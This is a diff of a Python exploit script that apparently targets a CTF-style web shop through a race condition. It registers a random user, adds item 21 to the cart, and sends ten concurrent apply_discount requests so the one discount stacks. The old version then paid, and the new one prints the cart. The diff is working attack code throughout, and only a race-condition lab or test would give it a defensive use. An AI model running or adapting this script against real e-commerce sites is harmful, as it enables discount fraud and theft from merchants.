@@ -1,4 +1,3 @@
-import imp
 from threading import Thread
 import time
 import requests
@@ -17,21 +16,18 @@ def register(username, password):
 def login(username, password):
 	url = URL + "/login"
 	payload = {'username' : username, 'password' : password}
-	r = requests.post(url, data=payload)
-	return cookies['session']
+	return requests.post(url, data=payload).cookies["session"]
 
 def addCart(session):
 	url = URL + "/add_to_cart?item_id=21"
 	cookies = { 'session': session }
-	r = requests.get(url, cookies=cookies)
-	return r.text
+	return requests.get(url, cookies=cookies)
 
 def applyDiscount(session, discount):
 	url = URL + "/apply_discount"
 	payload = {'discount': discount }
 	cookies = { 'session': session }
-	r = requests.post(url, data=payload, cookies=cookies)
-	return r.text
+	return requests.post(url, data=payload, cookies=cookies)
 
 def pay(session):
 	url = URL + "/cart/pay"
@@ -43,35 +39,31 @@ def items(session):
 	url = URL + "/items"
 	cookies = { 'session': session }
 	r = requests.get(url, cookies=cookies)
-	return r.text#[r.text.find("owned by you"):r.text.find("owned by you")+100]
+	return r.text
 
 def randomString(length):
 	letters = string.ascii_lowercase
 	return ''.join(random.choice(letters) for i in range(length))
 
+def cart(s):
+	cookies = {"session": s}
+	return requests.get(URL+"/cart", cookies=cookies)
 
-i = 0
-while i<100:
-	username = randomString(10)
-	password = randomString(10)
 
-	discount = register(username, password)
-	session = login(username, password)
-	addCart(session)
+username = randomString(10)
+password = randomString(10)
+discount = register(username, password)
+session = login(username, password)
+addCart(session)
+discountRoutine = []
 
-	discountRoutine = []
-	i = 0
-	for i in range(0, 10):
-		discountRoutine.append(Thread(target=applyDiscount, args=[session, discount]))
+for i in range(0, 10):
+	discountRoutine.append(Thread(target=applyDiscount, args=[session, discount]))
 
-	for i in range(0, 10):
-		discountRoutine[i].start()
+for i in range(0, 10):
+	discountRoutine[i].start()
 
-	for i in range(0, 10):
-		discountRoutine[i].join()
+for i in range(0, 10):
+	discountRoutine[i].join()
 
-	pay(session)
-	print(items(session))
-
-	i = i + 1
-	time.sleep(0.1)
+print(cart(session).text)
